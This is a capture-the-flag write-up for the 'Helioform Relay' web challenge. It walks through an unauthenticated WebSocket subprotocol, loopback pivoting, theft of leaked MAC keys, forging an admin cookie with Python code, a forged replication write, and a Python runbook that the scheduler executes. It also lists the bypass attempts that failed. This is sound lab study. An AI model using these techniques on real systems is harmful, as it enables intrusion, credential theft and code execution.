# Helioform Relay

**Author:** mar

**Web** · 682 pts (hard)
Instance: `w05.ctf.chronos-security.ro:32977` — `Server: helioform-relay/4.2`
No handout: the appliance documents itself at `/docs/hsp` and `/docs/session`.

**TL;DR.** `/mesh` accepts the on-box agent subprotocol `hsp.raw.1` on the strength of the
`Sec-WebSocket-Protocol` token alone — the documentation's claim that "the edge authenticates an
agent" is false. The raw stream implements `DIAL`, which splices TCP to `127.0.0.1` and reaches the
provisioner. A mesh ticket from catalogd buys `/etc/helioform/relay.env`, which contains the factory
`CONSOLE_MAC_KEY` and `REPLICATION_MAC_KEY`. The first key forges an admin `hsp_session` cookie; the
second signs a peer `hello`/`blob` on the replication port, whose `stream_id` is used as a filesystem
path. Writing a Python runbook into `/var/lib/helioform/runbooks` makes the compliance scheduler
execute it, and its stdout is rendered under *Last output* on `/console/automation`.

## Solve

**The surface.** One HTTP service exposes the site (`/`), the customer mesh (`GET /mesh`), the
protocol docs (`/docs/hsp`, `/docs/session`), the operator console (`/console/login`) and a health
endpoint (`/healthz`). `/` names the parts:

> The customer mesh is a WebSocket at `/mesh`. Read the session notes before writing a client. …
> Protocol notes live at `/docs/hsp`. The console is at `/console/login`.

`/docs/hsp` documents two subprotocols. `hsp.ws.1` is the customer channel (`HELLO`, `PING`,
`SUBSCRIBE`). `hsp.raw.1` is for "agents that cannot mask WebSocket frames"; after the 101 the socket
is a raw HSP byte stream. The same page says the edge authenticates an agent — it does not.

**1. The agent wire is unauthenticated.** The only gate is a comma-split, whitespace-trimmed,
case-sensitive exact match on a client-controlled header:

```http
GET /mesh HTTP/1.1
Host: x
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <base64 of 16 random bytes>
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: hsp.raw.1
```

→ `101 Switching Protocols`, `Sec-WebSocket-Protocol: hsp.raw.1`, then a raw HSP stream with no
WebSocket masking. Measured token matrix:

| `Sec-WebSocket-Protocol` | result |
| --- | --- |
| absent | `400` |
| `hsp.ws.1` | `101`, customer framing |
| `hsp.raw.1` | `101`, **raw** |
| `hsp.ws.1, hsp.raw.1` | `101`, **raw** (raw wins) |
| `foo, hsp.raw.1` | `101`, raw |
| `HSP.RAW.1`, `xhsp.raw.1`, `hsp.raw.1x`, `hsp.raw.1;q=1`, `*` | `400` |

No agent credential, ticket, mTLS, source check, `Origin`, `Authorization` or cookie is consulted.
The card's 30-point hint is exactly this entry: two subprotocols are advertised, one is for on-box
agents and admits a raw frame stream, and the server checks only the token. The banner is a label,
not a check:

```
hsp-edge/4.2 transport=raw auth=legacy-proxy
commands=HELLO:0x01,PING:0x02,DIAL:0x10
dial=host:port
dial-ack=splices
egress=127.0.0.1
```

Frame: `b"HSP1"` · u16 opcode · u16 flags · u32 body length · body, little-endian. A reply repeats
the opcode with flag `0x0001`; an error is opcode `0x007F` plus an ASCII reason.

**2. DIAL reaches the loopback services.** `0x10` with the ASCII body `127.0.0.1:<port>` splices raw
TCP. Only the literal `127.0.0.1` is allowed; `127.0.0.2`, `localhost`, `0x7f000001`, `2130706433`,
`[::1]`, `127.0.0.1.nip.io` and service names all return `err: egress denied`. The loopback
inventory is:

| port | service | role |
| --- | --- | --- |
| 7710 | catalogd | issues mesh tickets |
| 7711 | provd | dotenv export broker |
| 7712 | recordd | ledger status |
| 7713 | peer | replication commits |
| 8080 | the HTTP app | site + console |

**3. A ticket and the provisioner.** catalogd `HELLO` (`0x01`) returns `nonce=<32 hex>`. Sending
`0x20` with that nonce as the *entire* body returns `ticket=tkt.<nonce>.<mac>` and `ttl=600`.
`0x30` to provd with `ticket=<t>\npath=/etc/helioform/relay.env\n` returns the factory environment:

```
CONSOLE_MAC_KEY=7f3c9a2e1b84d056a0c3e91f44b7d2aa
CONSOLE_ISS=helioform-factory
CONSOLE_AUD=relay-console
REPLICATION_MAC_KEY=c1d4e8f02a6b9375d0e1f4a8b2c65d90
MESH_CAPTURE_ENABLED=1
```

`/etc/helioform/collector.env` adds `COLLECTOR_PEER=relay-collector`,
`COLLECTOR_INTERVAL_SEC=5`, `LOG_ROOT=/var/log/helioform/streams`, `SITE_ID=north`. provd is strict
(`normpath → .env suffix → commonpath /etc/helioform → open`); only those two files exist and `..`
traversal is refused. The comment in `relay.env` is the challenge's own summary: both the console
verifier and the replication MAC "fall back to these values when the site has not been moved to the
hardware keystore".

**4. Forge the console session.** `/docs/session` gives the cookie format:

```
hsp_session = payload_b64 . mac_hex
payload_b64 = base64url(JSON {iss, aud, role, exp}) with padding removed
mac_hex     = HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64)
```

`role` must be `admin`, `exp` must be in the future, and `iss`/`aud` must match the environment. With
the leaked key:

```python
payload = base64.urlsafe_b64encode(json.dumps({
    "iss": "helioform-factory", "aud": "relay-console",
    "role": "admin", "exp": int(time.time()) + 3600,
}, separators=(",", ":")).encode()).decode().rstrip("=")
mac = hmac.new(b"7f3c9a2e1b84d056a0c3e91f44b7d2aa",
               payload.encode(), hashlib.sha256).hexdigest()
cookie = "hsp_session=%s.%s" % (payload, mac)
```

`/console`, `/console/trace` and `/console/automation` then return `200`. A bad MAC, a missing
cookie, an expired `exp`, or any role other than `admin` returns `401`.

**5. The replication write.** `/console/trace` documents the peer protocol. `recordd` status
(`0x40` with the mesh ticket) returns `epoch`, `tip[32]` and `bind[16]`. A commit is a peer `hello`
(`0x11`) followed by a `blob` (`0x17`):

```
hello: u16 peer_len | peer | u32 epoch | tip[32] | mac[32]
       mac = HMAC-SHA256(REPLICATION_MAC_KEY,
             "hsp-repl/1|hello|{epoch}|{tip_hex}|{peer}")

blob:  u16 stream_len | stream_id | u8 mode | u32 epoch | tip[32] | bind[16]
       | u32 body_len | body | mac[32]
       mac = HMAC-SHA256(REPLICATION_MAC_KEY,
             "hsp-repl/1|blob|{epoch}|{tip_hex}|{bind_hex}|{stream_id}|{sha256(body)_hex}")
```

`peer` is `relay-collector` (the only known peer). `mode 0x01` replaces the resolved stream file
with `body`; the reply echoes `ok path=<stream_id>`. Tip and bind rotate on each accepted commit, so
every write needs a fresh status. This is an arbitrary file write as the relay user, limited only by
what the recordd process can open.

**6. The runbook.** `/console/automation` documents the last hop:

```
Directory  /var/lib/helioform/runbooks
Header     HSP-RUNBOOK
Interval   5s, and whenever a new file is written
Last output <pre id="runbook-output">idle</pre>
```

Write `/var/lib/helioform/runbooks/00-compliance` with the header line and Python source:

```python
HSP-RUNBOOK
import glob
for pat in ["/flag", "/flag.txt", "/root/flag*", "/home/*/flag*", "/etc/flag*"]:
    for q in glob.glob(pat):
        try:
            print(open(q).read())
        except Exception:
            pass
```

The scheduler strips the first line and executes the rest as Python. The next poll of
`/console/automation` shows:

```
CSCTF{LyWRYbNdtewez9GWq82qql5M}
```

Both `/flag` and `/tmp/flag` contain the flag.

**Dead ends (all measured).**

- **The runbook directory was read-only for most of the event.** Every write to
  `/var/lib/helioform/runbooks/<name>` returned `err: open failed`, including ~200 names, ~90
  subdirectories, ~200 alternate roots and `/proc/<pid>/root/...` for pids 1–300. The team proved the
  whole chain short of execution on 7/7 instances; the organisers later fixed the platform-side
  filesystem issue, after which `ok path=/var/lib/helioform/runbooks/00-compliance` and the scheduler
  ran the payload immediately. The writeup above is the post-fix run.
- **A shell runbook does not work.** The scheduler is Python, not `/bin/sh`: a `#!/bin/sh` body
  produces `SyntaxError: invalid syntax` at the first shell line. The payload must be valid Python
  after `HSP-RUNBOOK`.
- **Writing to `/tmp` or `/dev/shm` is not enough.** Those are writable and are mirrored into the
  ledger, but the scheduler never executes them; only the advertised runbook directory does.
- **provd path traversal.** `/etc/helioform/../flag.env`, `../../flag.env` and every variant return
  `path outside provision root`; `/etc/passwd` and `/flag` are refused as non-`.env` paths; only
  `relay.env` and `collector.env` exist among ~180 names.
- **`hsp.ws.1` cannot dial.** The customer channel answers `DIAL` with
  `err: scope edge.dial required`; the raw channel's `legacy-proxy` label is what carries the scope.
- **Console login.** Nine users × sixteen passwords, SQLi and path payloads all return
  `Invalid credentials` with no `Set-Cookie`; the only way in is the forged factory cookie.
- **Console route/field fuzz.** No route other than `/console`, `/console/trace`,
  `/console/automation`; query parameters, extra cookie claims (`dir`, `runbook`, `path`, `cmd`, …),
  `Host` overrides and header injection do not change the directory or the output.
- **DIAL egress.** `localhost`, `127.0.0.2`, decimal/hex loopback, IPv6, DNS names and unix sockets
  are all denied; the literal `127.0.0.1` is the only accepted host.

**Flag:** `CSCTF{LyWRYbNdtewez9GWq82qql5M}`

Run [solve.py](solve.py) with
`HELIO_HOST=<worker>.ctf.chronos-security.ro HELIO_PORT=<port> python3 solve.py`; it performs the
whole chain and polls `/console/automation` for the flag. The factory keys are static across
instances, which is why the script can hard-code the protocol details but not the host.

*AI: Hermes (DeepSeek 4.1 Flash) assembled this writeup from the team's live-instance work log
(`ctf-helio/WRITEUP.md`, `REPORT-FULL.md`), the captured pages and `solve_helio.py`; the flag is the
one the platform accepted at 2026-11-06 23:15:49Z.*
